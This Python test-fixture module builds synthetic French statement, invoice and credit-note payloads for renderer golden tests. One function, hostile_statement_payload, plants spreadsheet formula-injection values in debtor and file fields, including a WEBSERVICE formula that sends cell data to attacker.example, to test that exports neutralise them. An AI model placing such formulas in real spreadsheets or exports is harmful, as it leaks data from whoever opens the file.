"""Synthetic payloads for the statement and invoice renderers (M2c-5), in the shape the SQL builds
them (`private.remittance_statement_build`, `private.issue_commission_documents`). Fixed values:
the golden hashes and text snapshots of tests/test_statement_docs.py depend on them."""

from __future__ import annotations

import copy
from datetime import date
from typing import Any

OFFICE = {"line1": "10 rue de la Bourse", "postcode": "75002", "city": "Paris", "country": "FR"}
SELLER: dict[str, Any] = {
    "name": "Collectoo",
    "siren": "732829320",
    "currency": "EUR",
    "rcs_city": "Paris",
    "legal_form": "SAS",
    "vat_number": "FR44732829320",
    "in_liquidation": False,
    "billing_address": OFFICE,
    "is_professional": True,
    "registered_office": OFFICE,
    "share_capital_minor": "1000000",
    "invoice_acceptance_ref": None,
    "entrepreneur_individuel": False,
}
BUYER: dict[str, Any] = {
    "name": "Martin SAS",
    "siren": "552100554",
    "currency": "EUR",
    "rcs_city": "Lyon",
    "legal_form": "SAS",
    "vat_number": None,
    "in_liquidation": False,
    "billing_address": {
        "line1": "3 quai Perrache",
        "line2": "Bât. B",
        "postcode": "69002",
        "city": "Lyon",
        "country": "FR",
    },
    "is_professional": True,
    "registered_office": {
        "line1": "3 quai Perrache",
        "postcode": "69002",
        "city": "Lyon",
        "country": "FR",
    },
    "share_capital_minor": "500000",
    "invoice_acceptance_ref": "art. 11 du mandat",
    "entrepreneur_individuel": False,
}
COLUMNS = [
    "line_no", "mandate", "portfolio", "file", "debtor", "items", "components", "nature",
    "nature_reason", "from_run", "encaissement_date", "effective_date", "deadline", "amount_minor",
    "rules", "rates", "basis_minor", "commission_minor", "commission_state", "invoice", "receipt",
    "late", "late_cause",
]  # fmt: skip


def _line(  # noqa: PLR0913, PLR0917 - a fixture row
    no: int, file: str, debtor: str, kind: str, amount: int, commission: int, **kw: Any
) -> list[Any]:
    v: dict[str, Any] = {
        "line_no": no,
        "mandate": "MAND-MARTIN-2026",
        "portfolio": "Factures B2B",
        "file": file,
        "debtor": debtor,
        "items": [["invoice", f"F-{no:03d}"]],
        "components": ["principal"],
        "nature": kind,
        "nature_reason": None,
        "from_run": None,
        "encaissement_date": "2026-10-21",
        "effective_date": "2026-10-21",
        "deadline": "2026-11-20",
        "amount_minor": str(amount),
        "rules": ["Factures entre professionnels"],
        "rates": ["0.15"],
        "basis_minor": str(amount),
        "commission_minor": str(commission),
        "commission_state": "charged",
        "invoice": "FC-2026-000003",
        "receipt": f"Q-2026-{no:06d}",
        "late": False,
        "late_cause": None,
    }
    v.update(kw)
    return [v[c] for c in COLUMNS]


def statement_payload() -> dict[str, Any]:
    """RV-2026-000002 of Martin SAS: three files, a bank return credited on the invoice that
    charged it, a forward of a recalled file, a collection whose commission an earlier run left
    pending, a late line; an invoice and a credit note netted, an earlier invoice set off; the
    previous payout debited; money held and refunded on the files."""
    lines = [
        _line(
            1,
            "L-001",
            "Durand SARL",
            "allocation",
            200_000,
            30_000,
            components=["principal", "accrued_interest"],
            items=[["invoice", "F-001"], ["invoice", "F-002"]],
        ),
        _line(
            2,
            "L-002",
            "Petit & Fils",
            "allocation",
            50_000,
            7_500,
            late=True,
            late_cause="approved_late",
            encaissement_date="2026-09-30",
            effective_date="2026-09-30",
            deadline="2026-10-30",
        ),
        _line(
            3,
            "L-001",
            "Durand SARL",
            "allocation_reversal",
            -20_000,
            -3_000,
            nature_reason="bank_return",
            encaissement_date="2026-10-02",
            effective_date="2026-10-28",
            invoice="FC-2026-000004",
        ),
        _line(
            4,
            "L-003",
            "Société Nouvelle d'Équipement",
            "forward",
            12_345,
            0,
            nature_reason="file_recalled",
            items=[],
            components=[],
            rules=[],
            rates=[],
            basis_minor="0",
            commission_state="none",
            invoice=None,
        ),
        _line(
            5,
            "L-003",
            "Société Nouvelle d'Équipement",
            "allocation",
            1_000,
            0,
            commission_state="pending",
            rules=[],
            rates=[],
            basis_minor="0",
            invoice=None,
        ),
        _line(
            9,
            "L-002",
            "Petit & Fils",
            "allocation",
            0,
            1_200,
            from_run="RV-2026-000001",
            encaissement_date="2026-10-01",
            effective_date="2026-10-01",
            deadline="2026-10-31",
        ),
    ]
    return {
        "schema": 1,
        "number": "RV-2026-000002",
        "issue_date": "2026-11-02",
        "known_at": "2026-11-02T04:47:00Z",
        "currency": "EUR",
        "exponent": 2,
        "status": "approved",
        "cancelled_on": None,
        "settled_on": None,
        "issuer": copy.deepcopy(SELLER),
        "client": copy.deepcopy(BUYER),
        "mandates": [
            {
                "reference": "MAND-MARTIN-2026",
                "signed_on": "2026-01-15",
                "commission_clause_ref": "art. 6",
                "remittance_clause_ref": "art. 7",
                "netting_clause_ref": "art. 7.2",
                "clawback_clause_ref": "art. 7.4",
            }
        ],
        "service_period": {"from": "2026-10-21", "to": "2026-11-02"},
        "totals": {
            "line_count": 5,
            "repriced_count": 1,
            "file_count": 3,
            "repriced_only_file_count": 0,
            "collected_minor": "263345",
            "reversed_minor": "-20000",
            "commission_ht_minor": "35700",
            "late_count": 1,
            "gross_minor": "243345",
            "invoice_ht_minor": "38700",
            "invoice_vat_minor": "7740",
            "invoice_ttc_minor": "46440",
            "credit_ht_minor": "3000",
            "credit_vat_minor": "600",
            "credit_ttc_minor": "3600",
            "commission_taken_minor": "56840",
            "advance_recovered_minor": "0",
            "refund_minor": "0",
            "settlement_minor": "56840",
            "net_minor": "186505",
        },
        "files": [
            {
                "file": "L-001",
                "debtor": "Durand SARL",
                "lines": "2",
                "amount_minor": "180000",
                "commission_minor": "27000",
                "late": "0",
            },
            {
                "file": "L-002",
                "debtor": "Petit & Fils",
                "lines": "1",
                "amount_minor": "50000",
                "commission_minor": "8700",
                "late": "1",
            },
            {
                "file": "L-003",
                "debtor": "Société Nouvelle d'Équipement",
                "lines": "2",
                "amount_minor": "13345",
                "commission_minor": "0",
                "late": "0",
            },
        ],
        "natures": [
            {
                "kind": "allocation",
                "reason": None,
                "count": "3",
                "amount_minor": "251000",
                "commission_minor": "37500",
            },
            {
                "kind": "allocation_reversal",
                "reason": "bank_return",
                "count": "1",
                "amount_minor": "-20000",
                "commission_minor": "-3000",
            },
            {
                "kind": "forward",
                "reason": "file_recalled",
                "count": "1",
                "amount_minor": "12345",
                "commission_minor": "0",
            },
            {
                "kind": "repricing",
                "reason": None,
                "count": "1",
                "amount_minor": "0",
                "commission_minor": "1200",
            },
        ],
        "line_columns": list(COLUMNS),
        "lines": lines,
        "documents": [
            {
                "id": "d0000000-0000-0000-0000-000000000003",
                "kind": "invoice",
                "number": "FC-2026-000003",
                "issue_date": "2026-11-02",
                "reason": "commission",
                "mandate": "MAND-MARTIN-2026",
                "ht_minor": "38700",
                "vat_minor": "7740",
                "ttc_minor": "46440",
                "vat_rate": "0.2000",
                "settlement": "netted",
                "due_date": None,
                "clause_ref": "art. 7.2",
                "payment_reference": {
                    "mode": "run",
                    "run_number": "RV-2026-000002",
                    "execution_date": "2026-11-03",
                    "transfer": True,
                    "amount_minor": "46440",
                },
                "own_account": None,
                "corrects": [],
                "cancelled_by": [],
                "settles_minor": "46440",
            },
            {
                "id": "d0000000-0000-0000-0000-000000000004",
                "kind": "credit_note",
                "number": "FC-2026-000004",
                "issue_date": "2026-11-02",
                "reason": "commission",
                "mandate": "MAND-MARTIN-2026",
                "ht_minor": "-3000",
                "vat_minor": "-600",
                "ttc_minor": "-3600",
                "vat_rate": None,
                "settlement": "netted",
                "due_date": None,
                "clause_ref": "art. 7.2",
                "payment_reference": {
                    "mode": "run",
                    "run_number": "RV-2026-000002",
                    "execution_date": "2026-11-03",
                    "transfer": True,
                    "amount_minor": "0",
                },
                "own_account": None,
                "cancelled_by": [],
                "corrects": [
                    {
                        "number": "FC-2026-000001",
                        "issue_date": "2026-10-20",
                        "ht_minor": "-3000",
                        "vat_minor": "-600",
                    }
                ],
                "settles_minor": "0",
            },
        ],
        "earlier_settled": [
            {
                "kind": "compensation",
                "document_kind": "invoice",
                "number": "FC-2026-000001",
                "issue_date": "2026-10-20",
                "amount_minor": "10400",
            },
        ],
        "payout": {
            "amount_minor": "186505",
            "ordered_on": "2026-11-02",
            "requested_execution_date": "2026-11-03",
            "iban": "FR76 •••• •••• •••• 1234",
            "holder": "MARTIN SAS",
            "end_to_end_id": "RMT0A1B2C3D4E5F",
            "status": "ordered",
        },
        "requested_execution_date": "2026-11-03",
        "follow_up": [
            {
                "number": "RV-2026-000001",
                "status": "booked",
                "net_minor": "100000",
                "transfer_status": "booked",
                "requested_execution_date": "2026-10-21",
                "amount_minor": "100000",
                "debited_on": "2026-10-21",
                "returned_on": None,
                "booked_on": "2026-10-21",
            },
        ],
        "not_remitted": {
            "held": [
                {
                    "file": "L-002",
                    "reason": "hold_blocks_allocation",
                    "currency": "EUR",
                    "amount_minor": "15000",
                    "first_date": "2026-10-12",
                    "last_date": "2026-10-19",
                    "count": "2",
                },
            ],
            "refunded": [
                {
                    "file": "L-009",
                    "reason": "overpayment",
                    "currency": "EUR",
                    "amount_minor": "8000",
                    "first_date": "2026-10-21",
                    "last_date": "2026-10-21",
                    "count": "1",
                },
            ],
        },
        "position": {
            "owed_before_minor": "243345",
            "owed_after_minor": "0",
            "receivable_before_minor": "14000",
            "receivable_after_minor": "0",
            "advances_before_minor": "0",
            "advances_after_minor": "0",
        },
    }


INVOICE_LINES = [
    {
        "kind": "commission",
        "designation_fr": (
            "Commission de recouvrement amiable — Factures entre professionnels — 15\u00a0% sur "
            "2\u202f500,00\u00a0€ encaissés du 21/10/2026 au 02/11/2026 (mandat MAND-MARTIN-2026, "
            "relevé RV-2026-000002)"
        ),
        "claim_type": "b2b_invoice",
        "rule_id": "b2b",
        "families": ["principal", "interest"],
        "tiers": [["0.15", "250000"]],
        "ht": "37500",
        "vat_rate": "0.2000",
    },
    {
        "kind": "regularisation",
        "designation_fr": (
            "Régularisation de paliers (changement de conditions) — encaissements du 21/10/2026 au "
            "02/11/2026 (mandat MAND-MARTIN-2026, relevé RV-2026-000002)"
        ),
        "claim_type": "b2b_invoice",
        "rule_id": "b2b",
        "families": ["principal"],
        "tiers": [],
        "ht": "1200",
        "vat_rate": "0.2000",
    },
]


def invoice_payload(**over: Any) -> dict[str, Any]:
    """FC-2026-000003, netted on RV-2026-000002."""
    p: dict[str, Any] = {
        "kind": "invoice",
        "number": "FC-2026-000003",
        "issue_date": "2026-11-02",
        "seller": copy.deepcopy(SELLER),
        "buyer": copy.deepcopy(BUYER),
        "mandate": {"id": "70000000-0000-0000-0000-000000000001", "reference": "MAND-MARTIN-2026"},
        "run": {"id": "80000000-0000-0000-0000-000000000002", "number": "RV-2026-000002"},
        "service_period": {"from": "2026-10-21", "to": "2026-11-02"},
        "lines": copy.deepcopy(INVOICE_LINES),
        "corrections": [],
        "totals": {
            "ht_minor": "38700",
            "vat_minor": "7740",
            "ttc_minor": "46440",
            "vat_rate": "0.2000",
            "currency": "EUR",
        },
        "settlement": {"mode": "netted", "clause_ref": "art. 7.2", "due_days": None},
        "due_date": None,
        "payment_reference": {
            "mode": "run",
            "run_number": "RV-2026-000002",
            "execution_date": "2026-11-03",
            "transfer": True,
            "amount_minor": "46440",
        },
        "own_account": None,
        "penalty_text": (
            "Pénalités de retard : taux d'intérêt appliqué par la Banque centrale européenne à son "
            "opération de refinancement la plus récente, majoré de 10 points de pourcentage."
        ),
        "flat_indemnity": {"applies": True, "amount_minor": "4000", "proceeding": None},
        "vat_on_debits": False,
        "reason": "commission",
    }
    p.update(over)
    return p


def due_invoice_payload() -> dict[str, Any]:
    """Without a netting clause: due within 30 days to the own account, frozen at issue."""
    return invoice_payload(
        number="FC-2026-000005",
        settlement={"mode": "due", "clause_ref": None, "due_days": 30},
        due_date="2026-12-02",
        payment_reference=None,
        own_account={
            "iban": "FR7630006000011234567890189",
            "bic": "AGRIFRPPXXX",
            "holder": "Collectoo",
        },
    )


def credit_note_payload() -> dict[str, Any]:
    return invoice_payload(
        kind="credit_note",
        number="FC-2026-000004",
        lines=[
            {
                "kind": "credit",
                "designation_fr": (
                    "Avoir rectifiant la facture FC-2026-000001 du 20/10/2026 — encaissements "
                    "annulés (relevé RV-2026-000002)"
                ),
                "ht": "-3000",
                "vat_rate": "0.2000",
                "original_invoice_id": "c0000000-0000-0000-0000-000000000001",
            }
        ],
        corrections=[
            {
                "original_invoice_id": "c0000000-0000-0000-0000-000000000001",
                "vat_rate": "0.2000",
                "ht": "-3000",
                "vat": "-600",
            },
        ],
        totals={
            "ht_minor": "-3000",
            "vat_minor": "-600",
            "ttc_minor": "-3600",
            "vat_rate": None,
            "currency": "EUR",
        },
        flat_indemnity={"applies": True, "amount_minor": "4000"},
    )


CREDIT_REFS = {
    "c0000000-0000-0000-0000-000000000001": {"number": "FC-2026-000001", "issue_date": "2026-10-20"}
}
ISSUE = date(2026, 11, 2)


# -- review fixes (M2c-5 review) -----------------------------------------------------------------


def hostile_statement_payload() -> dict[str, Any]:
    """Boarded text a spreadsheet would run as a formula (review security#0): a debtor, a file
    reference, a mandate and a portfolio starting with = @ + -, a tab and a carriage return."""
    p = statement_payload()
    cols = {name: i for i, name in enumerate(COLUMNS)}
    first = p["lines"][0]
    first[cols["debtor"]] = '=WEBSERVICE("https://attacker.example/?"&B2)'
    first[cols["file"]] = "@SUM(1+1)"
    first[cols["mandate"]] = "+1+cmd"
    first[cols["portfolio"]] = "-2+3"
    second = p["lines"][1]
    second[cols["debtor"]] = "\tTAB SARL"
    second[cols["file"]] = "\rCR-1"
    return p


def partial_invoice_payload() -> dict[str, Any]:
    """FC-2026-000003 of which the plan sets off 200,00 € on RV-2026-000002 (older invoices taken
    first): the remainder on the next run by its latest date (review legal#4)."""
    return invoice_payload(
        due_date="2026-12-02",
        payment_reference={
            "mode": "run",
            "run_number": "RV-2026-000002",
            "execution_date": "2026-11-03",
            "transfer": True,
            "amount_minor": "20000",
            "remainder_minor": "26440",
            "latest_date": "2026-12-02",
        },
    )


def partial_statement_payload() -> dict[str, Any]:
    p = statement_payload()
    doc = p["documents"][0]
    doc["settles_minor"] = "20000"
    doc["due_date"] = "2026-12-02"
    doc["payment_reference"] = copy.deepcopy(partial_invoice_payload()["payment_reference"])
    return p


def zero_net_invoice_payload() -> dict[str, Any]:
    """A run that transfers nothing (N = 0): its plan posted at approval (review legal#5)."""
    return invoice_payload(
        payment_reference={
            "mode": "run",
            "run_number": "RV-2026-000002",
            "execution_date": "2026-11-02",
            "transfer": False,
            "amount_minor": "46440",
        },
    )


def zero_net_statement_payload() -> dict[str, Any]:
    p = statement_payload()
    p["status"], p["settled_on"], p["payout"], p["requested_execution_date"] = (
        "booked",
        "2026-11-02",
        None,
        None,
    )
    p["totals"]["net_minor"] = "0"
    p["documents"][0]["payment_reference"] = copy.deepcopy(
        zero_net_invoice_payload()["payment_reference"]
    )
    return p


def cancelled_statement_payload() -> dict[str, Any]:
    """RV-2026-000002 cancelled before its statement was drawn (review legal#2, figures#0): its
    invoice annulled by the cancellation's credit note, nothing set off, the gross still owed."""
    p = statement_payload()
    p["status"], p["cancelled_on"] = "cancelled", "2026-11-03"
    p["payout"]["status"] = "cancelled"
    for d in p["documents"]:
        d["settles_minor"] = "0"
    p["documents"][0]["cancelled_by"] = [{"number": "FC-2026-000005", "issue_date": "2026-11-03"}]
    p["documents"].append(
        {
            "id": "d0000000-0000-0000-0000-000000000005",
            "kind": "credit_note",
            "number": "FC-2026-000005",
            "issue_date": "2026-11-03",
            "reason": "run_cancelled",
            "mandate": "MAND-MARTIN-2026",
            "ht_minor": "-38700",
            "vat_minor": "-7740",
            "ttc_minor": "-46440",
            "vat_rate": None,
            "settlement": "netted",
            "due_date": None,
            "clause_ref": None,
            "payment_reference": None,
            "own_account": None,
            "corrects": [
                {
                    "number": "FC-2026-000003",
                    "issue_date": "2026-11-02",
                    "ht_minor": "-38700",
                    "vat_minor": "-7740",
                }
            ],
            "cancelled_by": [],
            "settles_minor": "0",
        }
    )
    p["earlier_settled"] = []
    p["position"].update(
        owed_after_minor=p["position"]["owed_before_minor"], receivable_after_minor="10400"
    )
    return p


def proceeding_invoice_payload() -> dict[str, Any]:
    """A professional buyer with a proceeding recorded before the issue: the 40 € is still stated
    (L441-9 I; review legal#0), the proceeding kept for the dunning step."""
    return invoice_payload(
        number="FC-2026-000006",
        flat_indemnity={
            "applies": True,
            "amount_minor": "4000",
            "proceeding": {"kind": "proceeding_opened", "effective_date": "2026-10-01"},
        },
    )
